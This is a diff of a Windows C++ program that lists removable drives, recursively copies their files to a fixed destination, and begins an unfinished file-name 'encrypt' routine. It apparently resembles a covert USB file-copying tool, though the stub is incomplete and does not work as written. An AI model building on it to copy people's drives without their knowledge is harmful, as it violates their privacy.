@@ -1,6 +1,7 @@
 ﻿#include<iostream>
 #include<io.h>
 #include<fstream>
+#include<random>
 #include<ctime>
 #include<windows.h>
 #include<boost/filesystem.hpp>
@@ -53,6 +54,33 @@ int getRemovableDriver(char(*remDrvList)[4])
 	return count;
 }
 
+bool willUseFile(const char* path)
+{
+	if (_access(path, 0))
+	{
+		if (CreateFileA(path, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr))
+		{
+			return true;
+		}
+		else return false;
+	}
+	else return true;
+}
+
+bool willUseDirectory(const char* path)
+{
+	if (_access(path, 0))
+	{
+		CreateDirectoryA(path, nullptr);
+		if (_access(path, 0))
+		{
+			return false;
+		}
+		else return true;
+	}
+	else return true;
+}
+
 void copyFiles(const char* src)
 {
 	for (recursive_directory_iterator iter(path(src, native)), end; iter != end; iter++)
@@ -68,6 +96,9 @@ void copyFiles(const char* src)
 					strcat_s(srcFilePath, 1024, iter->path().relative_path().string().c_str());
 					char desFilePath[1024]{};
 					strcat_s(desFilePath, 1024, DESTINATION);
+
+					//encrypt
+
 					strcat_s(desFilePath, 1024, iter->path().filename().string().c_str());
 
 					bool copySuccess = CopyFileA(srcFilePath, desFilePath, !OVERWRITER);
@@ -102,35 +133,40 @@ void copyFiles(const char* src)
 	}
 }
 
-bool willUseFile(const char* path)
+void fileNameEncrypt(char* fileName, ofstream* outputFile)
 {
-	if (_access(path, 0))
-	{
-		if (CreateFileA(path, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr))
-		{
-			return true;
-		}
-		else return false;
-	}
-	else return true;
-}
+	char oldFileName[1024]{}, ciphertext[1024]{};
+	strcpy_s(oldFileName, 1024, fileName);
 
-bool willUseDirectory(const char* path)
-{
-	if (_access(path, 0))
-	{
-		CreateDirectoryA(path, nullptr);
-		if (_access(path, 0))
-		{
-			return false;
-		}
-		else return true;
-	}
-	else return true;
-}
+	char optinalChar[1024]{};
+	
 
-void fileNameEncrypt(char* fileName)
-{
+
+	for (int i = 0; i < 128; i++)
+	{
+
+	}
+
+	srand(time(nullptr));
+	int random = rand();
+
+
+
+
+
+
+	char writeString[1024]{};
+	strcat_s(writeString, 1024, ciphertext);
+	strcat_s(writeString, 1024, "\t");
+	strcat_s(writeString, 1024, oldFileName);
+	strcat_s(writeString, 1024, "\n");
+
+
+
+	outputFile->open(fileName);
+	outputFile->write(writeString, 1024);
+
+
 
 }
 
